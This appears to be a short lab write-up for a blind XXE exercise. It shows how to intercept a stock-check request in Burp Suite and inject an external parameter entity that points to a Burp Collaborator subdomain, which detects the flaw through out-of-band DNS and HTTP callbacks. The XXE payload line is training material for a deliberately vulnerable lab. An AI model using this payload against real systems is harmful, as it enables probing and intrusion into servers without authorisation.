![image](https://github.com/udayk01/Web-Security/assets/52235763/4919eaaa-42cd-4e81-8d67-07bf9e9c3d9f)

## Solution:

> Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.

![image](https://github.com/udayk01/Web-Security/assets/52235763/bbcb593f-fb75-429d-9501-27fbf7637556)

> Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

```<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>```

![image](https://github.com/udayk01/Web-Security/assets/52235763/521c9dd6-dd99-4ece-948e-2399fdd740ea)

> Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

![image](https://github.com/udayk01/Web-Security/assets/52235763/5eca689e-40f3-434d-8ebf-caa5f98d281c)

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/888d0c23-da0d-4822-b9e0-250ffc34c34b)
